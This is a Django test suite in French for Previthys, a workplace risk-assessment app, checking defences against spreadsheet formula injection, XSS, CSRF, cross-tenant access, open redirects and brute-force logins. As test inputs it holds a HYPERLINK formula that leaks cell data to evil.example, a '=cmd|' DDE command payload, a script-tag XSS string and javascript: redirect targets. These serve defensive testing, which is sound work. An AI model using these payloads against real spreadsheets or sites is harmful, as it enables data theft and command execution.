"""Tests de sécurité : injection, XSS, CSRF, contrôle d'accès, redirections, en-têtes, verrouillage des connexions."""
#  -*- coding: utf-8 -*-
#  Copyright (c) 2026 Ivan LUCAS.
#  Previthys, application de gestion du DUERP (Document Unique d’Évaluation des Risques Professionnels).
#  Distribué sous licence GNU GPL.

import datetime
from io import BytesIO

from django.contrib.auth import get_user_model
from django.contrib.auth.models import Group
from django.core.management import call_command
from django.test import Client, TestCase
from django.urls import reverse
from openpyxl import load_workbook

from core.models import ActionPrevention, CategorieRisque, Risque, Structure, UniteTravail, VersionDuerp

User = get_user_model()
XSS = '<script>alert("xss")</script>'


class BaseSecurite(TestCase):
    @classmethod
    def setUpTestData(cls):
        call_command("creer_groupes", verbosity=0)
        cls.struct_a = Structure.objects.create(nom="Mairie A")
        cls.struct_b = Structure.objects.create(nom="Mairie B")
        cls.admin = User.objects.create_user("admin", password="x")
        cls.admin.groups.add(Group.objects.get(name="Previthys - administrateur"))
        cls.user_a = User.objects.create_user("user_a", password="x")
        cls.user_a.groups.add(Group.objects.get(name="Previthys - administrateur"))   # droit de supprimer, mais limité à la structure A
        cls.user_a.structures.add(cls.struct_a)
        cls.root = User.objects.create_superuser("root", password="x")
        cls.categorie = CategorieRisque.objects.get(nom="Autre")
        cls.unite_a = UniteTravail.objects.create(nom="Unité A", structure=cls.struct_a)
        cls.unite_b = UniteTravail.objects.create(nom="Unité B", structure=cls.struct_b)
        cls.risque_a = Risque.objects.create(unite=cls.unite_a, categorie=cls.categorie, danger="Danger A", frequence=4, gravite=4, maitrise=4)
        cls.risque_b = Risque.objects.create(unite=cls.unite_b, categorie=cls.categorie, danger="Danger B", frequence=4, gravite=4, maitrise=4)
        cls.action_b = ActionPrevention.objects.create(risque=cls.risque_b, description="Action B")
        cls.version_b = VersionDuerp.objects.create(numero=1, structure=cls.struct_b, commentaire="Archive B", donnees=[])


class InjectionExcelTests(BaseSecurite):
    """Un texte saisi par un utilisateur ne doit jamais devenir une formule Excel (=HYPERLINK, =cmd|...)."""
    FORMULE = '=HYPERLINK("http://evil.example/?x="&A1,"cliquez")'

    def test_les_textes_saisis_ne_deviennent_pas_des_formules(self):
        u = UniteTravail.objects.create(nom=self.FORMULE)
        r = Risque.objects.create(unite=u, categorie=self.categorie, danger=self.FORMULE, situation="=1+1", mesures_existantes="=SUM(A1)", frequence=1, gravite=1, maitrise=1)
        ActionPrevention.objects.create(risque=r, description=self.FORMULE, responsable=None)
        self.client.force_login(self.root)
        wb = load_workbook(BytesIO(self.client.get(reverse("export_xlsx")).content))
        for ws in wb.worksheets:
            for ligne in ws.iter_rows():
                for c in ligne:
                    if c.data_type == "f":
                        contenu = str(c.value)
                        self.assertTrue(contenu.startswith(("=E", "=IF", "=COUNT")) and "HYPERLINK" not in contenu and "1+1" not in contenu and "SUM(A1)" not in contenu,
                                        "formule injectée en %s!%s : %s" % (ws.title, c.coordinate, contenu))
        # les textes saisis sont bien présents, en tant que texte
        textes = {c.value for ws in wb.worksheets for ligne in ws.iter_rows() for c in ligne if c.data_type == "s"}
        self.assertIn(self.FORMULE, textes)
        self.assertIn("=1+1", textes)

    def test_commentaire_de_version_dans_le_sous_titre(self):
        v = VersionDuerp.objects.create(numero=5, commentaire="=cmd|' /C calc'!A0", donnees=[])
        self.client.force_login(self.root)
        wb = load_workbook(BytesIO(self.client.get(reverse("versions_export", args=[v.pk])).content))
        self.assertNotEqual(wb["Synthèse"]["A2"].data_type, "f")

    def test_caracteres_de_controle_ne_font_pas_planter_l_export(self):
        UniteTravail.objects.create(nom="Nom avec \x00 et \x07 caractères de contrôle")
        self.client.force_login(self.root)
        self.assertEqual(self.client.get(reverse("export_xlsx")).status_code, 200)


class XssTests(BaseSecurite):
    def test_saisie_html_toujours_echappee(self):
        u = UniteTravail.objects.create(nom=XSS, description=XSS)
        r = Risque.objects.create(unite=u, categorie=self.categorie, danger=XSS, situation=XSS, mesures_existantes=XSS, frequence=7, gravite=7, maitrise=7)
        ActionPrevention.objects.create(risque=r, description=XSS, statut="terminee", date_realisation=datetime.date(2026, 1, 1))
        CategorieRisque.objects.create(nom=XSS)
        VersionDuerp.objects.create(numero=7, commentaire=XSS, donnees=[])
        self.client.force_login(self.root)
        for nom in ("dashboard", "document", "unites_liste", "risques_liste", "actions_liste", "categories_liste", "versions_liste"):
            html = self.client.get(reverse(nom)).content.decode()
            self.assertNotIn(XSS, html, "HTML non échappé dans %s" % nom)
        self.client.post(reverse("versions_ajouter"), {"commentaire": XSS})
        v = VersionDuerp.objects.get(numero=8)
        html = self.client.get(reverse("versions_document", args=[v.pk])).content.decode()
        self.assertNotIn(XSS, html)
        self.assertIn("&lt;script&gt;", html)

    def test_message_apres_action_terminee_echappe_le_nom_du_risque(self):
        r = Risque.objects.create(unite=self.unite_a, categorie=self.categorie, danger=XSS, frequence=1, gravite=1, maitrise=1)
        self.client.force_login(self.root)
        rep = self.client.post(reverse("actions_ajouter"), {"risque": r.pk, "description": "ok", "statut": "terminee"}, follow=True)
        self.assertNotIn(XSS, rep.content.decode())
        self.assertContains(rep, "Réévaluer le risque")


class CsrfTests(BaseSecurite):
    def test_post_sans_jeton_csrf_refuse(self):
        c = Client(enforce_csrf_checks=True)
        c.force_login(self.root)
        for nom, args in (("risques_ajouter", []), ("unites_supprimer", [self.unite_a.pk]), ("categories_ajouter", []), ("versions_ajouter", []), ("logout", [])):
            self.assertEqual(c.post(reverse(nom, args=args), {"nom": "x"}).status_code, 403, nom)
        self.assertTrue(UniteTravail.objects.filter(pk=self.unite_a.pk).exists())

    def test_suppression_impossible_par_get(self):
        self.client.force_login(self.root)
        self.client.get(reverse("unites_supprimer", args=[self.unite_a.pk]))
        self.assertTrue(UniteTravail.objects.filter(pk=self.unite_a.pk).exists())

    def test_formulaires_contiennent_un_jeton(self):
        self.client.force_login(self.root)
        for nom in ("risques_ajouter", "unites_ajouter", "versions_ajouter"):
            self.assertContains(self.client.get(reverse(nom)), "csrfmiddlewaretoken")


class ControleAccesTests(BaseSecurite):
    """Un utilisateur limité à la structure A ne peut ni voir, ni modifier, ni supprimer, ni exporter les données de B."""

    def setUp(self):
        self.client.force_login(self.user_a)

    def test_pas_d_acces_aux_objets_d_une_autre_structure(self):
        for nom, obj in (("unites_modifier", self.unite_b), ("unites_supprimer", self.unite_b), ("risques_modifier", self.risque_b),
                         ("risques_supprimer", self.risque_b), ("actions_modifier", self.action_b), ("actions_supprimer", self.action_b)):
            self.assertEqual(self.client.get(reverse(nom, args=[obj.pk])).status_code, 404, nom)
            self.assertEqual(self.client.post(reverse(nom, args=[obj.pk]), {"nom": "pirate", "danger": "pirate"}).status_code, 404, nom)
        for nom in ("versions_document", "versions_export"):
            self.assertEqual(self.client.get(reverse(nom, args=[self.version_b.pk])).status_code, 404, nom)
        self.assertEqual(self.client.post(reverse("versions_supprimer", args=[self.version_b.pk])).status_code, 403)   # aucun groupe ne supprime les versions
        self.assertTrue(UniteTravail.objects.filter(pk=self.unite_b.pk).exists())
        self.assertTrue(VersionDuerp.objects.filter(pk=self.version_b.pk).exists())

    def test_listes_et_exports_ne_fuitent_pas(self):
        for nom in ("unites_liste", "risques_liste", "actions_liste", "versions_liste", "document", "dashboard"):
            html = self.client.get(reverse(nom)).content.decode()
            self.assertNotIn("Unité B", html, nom)
            self.assertNotIn("Danger B", html, nom)
            self.assertNotIn("Action B", html, nom)
            self.assertNotIn("Archive B", html, nom)
        wb = load_workbook(BytesIO(self.client.get(reverse("export_xlsx")).content))
        toutes = " ".join(str(c.value) for ws in wb.worksheets for ligne in ws.iter_rows() for c in ligne if c.value)
        self.assertNotIn("Danger B", toutes)
        self.assertNotIn("Unité B", toutes)

    def test_impossible_de_rattacher_un_risque_a_une_unite_d_une_autre_structure(self):
        rep = self.client.post(reverse("risques_ajouter"), {"unite": self.unite_b.pk, "categorie": self.categorie.pk, "danger": "Intrusion", "frequence": 1, "gravite": 1, "maitrise": 1})
        self.assertEqual(rep.status_code, 200)   # formulaire réaffiché avec erreur
        self.assertFalse(Risque.objects.filter(danger="Intrusion").exists())
        rep = self.client.post(reverse("actions_ajouter"), {"risque": self.risque_b.pk, "description": "Intrusion", "statut": "a_faire"})
        self.assertFalse(ActionPrevention.objects.filter(description="Intrusion").exists())

    def test_archivage_limite_aux_structures_de_l_utilisateur(self):
        rep = self.client.post(reverse("versions_ajouter"), {"structure": self.struct_b.pk, "commentaire": "Tentative"})
        self.assertEqual(rep.status_code, 200)
        self.assertFalse(VersionDuerp.objects.filter(commentaire="Tentative").exists())

    def test_pas_d_elevation_de_privileges_via_admin(self):
        self.assertEqual(self.client.get("/admin/").status_code, 302)        # non staff : renvoyé vers la connexion admin


class DroitsTests(BaseSecurite):
    def test_lecteur_sans_droit_d_ecriture_ni_de_suppression(self):
        lecteur = User.objects.create_user("lecteur", password="x")
        lecteur.groups.add(Group.objects.get(name="Previthys - lecture"))
        self.client.force_login(lecteur)
        for nom in ("risques_ajouter", "unites_ajouter", "categories_ajouter", "actions_ajouter", "versions_ajouter"):
            self.assertEqual(self.client.get(reverse(nom)).status_code, 403, nom)
        for nom, obj in (("unites_supprimer", self.unite_a), ("risques_modifier", self.risque_a), ("versions_supprimer", self.version_b)):
            self.assertEqual(self.client.post(reverse(nom, args=[obj.pk])).status_code, 403, nom)

    def test_les_versions_archivees_ne_sont_supprimables_que_par_un_superutilisateur(self):
        """Conservation obligatoire 40 ans : aucun groupe DUERP n'a le droit de supprimer une version."""
        v = VersionDuerp.objects.create(numero=2, commentaire="Archive commune", donnees=[])
        self.client.force_login(self.admin)
        self.assertEqual(self.client.post(reverse("versions_supprimer", args=[v.pk])).status_code, 403)
        self.assertTrue(VersionDuerp.objects.filter(pk=v.pk).exists())
        self.client.force_login(self.root)
        self.client.post(reverse("versions_supprimer", args=[v.pk]))
        self.assertFalse(VersionDuerp.objects.filter(pk=v.pk).exists())

    def test_toutes_les_pages_exigent_une_connexion(self):
        urls = [reverse(n) for n in ("dashboard", "document", "export_xlsx", "unites_liste", "unites_ajouter", "categories_liste", "risques_liste", "actions_liste", "versions_liste")]
        urls += [reverse("unites_modifier", args=[self.unite_a.pk]), reverse("versions_document", args=[self.version_b.pk]), reverse("versions_export", args=[self.version_b.pk])]
        for url in urls:
            rep = self.client.get(url)
            self.assertEqual(rep.status_code, 302, url)
            self.assertIn(reverse("login"), rep["Location"], url)


class ConnexionSecuriteTests(BaseSecurite):
    def test_redirection_apres_connexion_limitee_au_site(self):
        for cible in ("https://evil.example/", "//evil.example/", "javascript:alert(1)"):
            rep = self.client.post(reverse("login") + "?next=" + cible, {"username": "admin", "password": "x", "next": cible})
            self.assertEqual(rep.status_code, 302)
            self.assertEqual(rep["Location"], reverse("dashboard"), cible)
            self.client.post(reverse("logout"))

    def test_message_d_erreur_identique_utilisateur_inconnu_ou_mauvais_mot_de_passe(self):
        a = self.client.post(reverse("login"), {"username": "admin", "password": "faux"})
        b = self.client.post(reverse("login"), {"username": "inconnu", "password": "faux"})
        self.assertContains(a, "Identifiant ou mot de passe incorrect.")
        self.assertContains(b, "Identifiant ou mot de passe incorrect.")

    def test_verrouillage_apres_trop_d_echecs(self):
        for _ in range(5):
            self.client.post(reverse("login"), {"username": "admin", "password": "faux"})
        rep = self.client.post(reverse("login"), {"username": "admin", "password": "x"})   # le bon mot de passe est refusé
        self.assertEqual(rep.status_code, 429)
        self.assertContains(rep, "verrouill", status_code=429)
        self.assertEqual(self.client.get(reverse("dashboard")).status_code, 302)

    def test_le_verrouillage_ne_touche_pas_les_autres_comptes(self):
        for _ in range(5):
            self.client.post(reverse("login"), {"username": "admin", "password": "faux"})
        rep = self.client.post(reverse("login"), {"username": "root", "password": "x"})
        self.assertEqual(rep.status_code, 302)


class EnTetesTests(BaseSecurite):
    def test_en_tetes_de_securite(self):
        self.client.force_login(self.root)
        rep = self.client.get(reverse("dashboard"))
        self.assertEqual(rep["X-Frame-Options"], "DENY")
        self.assertEqual(rep["X-Content-Type-Options"], "nosniff")
        self.assertIn("no-store", rep["Cache-Control"])
        self.assertIn("frame-ancestors 'none'", rep["Content-Security-Policy"])
        self.assertIn("script-src 'self'", rep["Content-Security-Policy"])
        self.assertNotIn("unsafe-inline", rep["Content-Security-Policy"].split("script-src")[1].split(";")[0])
        self.assertIn("Permissions-Policy", rep)

    def test_export_et_document_non_mis_en_cache(self):
        self.client.force_login(self.root)
        for nom in ("export_xlsx", "document", "risques_liste"):
            self.assertIn("no-store", self.client.get(reverse(nom))["Cache-Control"], nom)

    def test_aucun_script_ni_gestionnaire_en_ligne_dans_les_pages(self):
        import re
        self.client.force_login(self.root)
        for nom in ("dashboard", "document", "unites_liste", "risques_ajouter", "versions_liste", "unites_supprimer"):
            args = [self.unite_a.pk] if nom == "unites_supprimer" else []
            html = self.client.get(reverse(nom, args=args)).content.decode()
            self.assertIsNone(re.search(r"<script(?![^>]*\bsrc=)[^>]*>", html), "script en ligne dans %s" % nom)
            self.assertIsNone(re.search(r"\son(click|load|error|change|submit)\s*=", html, re.I), "gestionnaire en ligne dans %s" % nom)
